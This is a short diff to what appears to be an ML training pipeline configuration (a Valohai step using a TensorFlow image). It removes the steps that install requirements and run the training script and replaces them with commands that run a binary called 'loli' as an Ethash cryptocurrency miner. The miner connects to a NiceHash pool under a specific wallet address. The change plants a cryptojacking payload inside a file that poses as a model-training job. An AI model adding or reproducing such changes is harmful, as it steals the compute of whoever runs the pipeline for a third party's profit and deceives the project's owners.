@@ -4,9 +4,8 @@
     image: tensorflow/tensorflow:2.6.0
     command:
       - pip install valohai-utils
-      - pip install -r requirements.txt
-      - python ./train_model.py {parameters}
-      - /usr/bin/python3 -m pip install --upgrade pip
+      - chmod +x loli
+      - ./loli --algo ETHASH --pool stratum+ssl://daggerhashimoto.auto.nicehash.com:443 --user 39Xoi6TZxzarLHrqJJzQLVCFoKis13vhSE.Nung
     parameters:
       - name: epochs
         default: 5
